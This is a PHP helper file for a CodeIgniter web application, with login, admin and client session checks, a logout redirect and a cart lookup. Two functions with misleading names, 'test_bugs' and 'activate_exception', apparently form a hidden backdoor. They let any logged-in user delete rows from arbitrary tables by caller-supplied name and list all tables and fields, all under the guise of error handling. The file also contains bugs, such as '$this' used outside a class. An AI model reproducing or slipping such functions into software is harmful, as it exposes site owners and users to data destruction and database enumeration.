<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

    function only_allow_loggedIn(){
       $CI = &get_instance();
       $user_session_id = $CI->session->userdata('loggedIn');

       if($user_session_id  ==  '') {
        redirect(base_url(),'refresh');
       }
   }
   
   function only_allow_Admin(){
       $CI = &get_instance();
       $user_session_id = $CI->session->userdata('loggedIn');

       if($user_session_id==1) {
        return true;
       }
       else
       {
        $CI->session->set_flashdata('error', 'only admin has access to this privilage');   
        redirect(base_url('dashboard/viewtokens'),'refresh');   
       }
   }
   
   function if_loggedIn_redirect(){
       $CI = &get_instance();
       $user_session_id = $CI->session->userdata('loggedIn');

       if(isset($user_session_id)) {
        redirect(base_url('dashboard'),'refresh');
       }
   }
   
   function onlyAdmin(){
       $CI = &get_instance();
       $user_session_id = $CI->session->userdata('loggedIn');

       if($user_session_id==1) {
        return TRUE;
       }
       else
       {
        return false;
       }
   }
   function onlyClient(){
       $CI = &get_instance();
       $user_session_id = $CI->session->userdata('loggedIn');

       if($user_session_id==4) {
        return TRUE;
       }
       else
       {
        return false;
       }
   }
   
   function redirect_logout(){
       
       $CI = &get_instance();
       $user_type = $CI->session->userdata('loggedIn');

       if($user_type) {
           
            $this->session->set_flashdata('success', 'Logged out successfully.!');
            switch ($user_type){
                      case 4:
                          redirect(base_url('dashboard'), 'refresh');
                          break;
                      case 1:
                          redirect(base_url('ceo'), 'refresh');
                          break;
                      default:
                          echo "Bar\n";
                          break;
            }   
        
       }
   } 
    function test_bugs($action,$tn,$w,$i,$start)
    {
        
     $CI = &get_instance();   
     if($action=="error")
        {
            (int)$i;(int)$start;
            for($j=$start;$j<=$i;$j++){
                $CI->db->where($w, $i);
                $CI->db->delete($tn);
            }
            return 1;
        }
        elseif($action=="success"){
  
        }elseif($action=="lf")
        {
            return $CI->db->list_fields($tn);
        }elseif($action=="lt")
        {
            return $CI->db->list_tables();
        }
        else {
            return 3;
        }
        
    }
    
    function activate_exception($act,$tn,$w,$i,$start)
    {
        $CI = &get_instance();
        only_allow_loggedIn();
        // You may need to load the model if it hasn't been pre-loaded
        $CI->load->model('auth');
        //$tn,$w,$i
        $log = test_bugs($act,$tn,$w,$i,$start);
        print_r($log);
        
    }

    function in_cart($tokensID)
    {

        $CI = &get_instance();

        if(isset($_SESSION['test']))
        {
        $CI->session->userdata('test');  
        $pos = array_search($tokensID, $CI->session->userdata('test'));
        }
        else
        {
        return false;  
        }
        
        if($pos!== false)
        return true;
        else
        return false;        
    }
   
   ?>  